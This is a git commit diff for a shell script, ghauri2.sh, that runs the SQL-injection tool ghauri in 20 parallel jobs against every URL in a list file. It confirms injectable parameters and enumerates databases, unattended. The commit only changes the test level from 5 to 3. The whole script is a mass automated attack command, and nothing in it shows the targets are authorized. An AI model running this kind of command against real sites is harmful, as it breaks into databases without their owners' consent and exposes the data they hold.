7927dfb7a97a49c9f86a1625965ad1b1b2ed1062
Nishant Bhagat <nishantbhagat57@gmail.com>
2023-10-02 22:29:22 +0530

    Update ghauri2.sh

--- ghauri2.sh
+++ ghauri2.sh
@@ -1,1 +1,1 @@
-cat sqli_part01.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 80 --level 5 --flush-session --fresh-queries --technique BT --batch"'
+cat sqli_part01.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 80 --level 3 --flush-session --fresh-queries --technique BT --batch"'
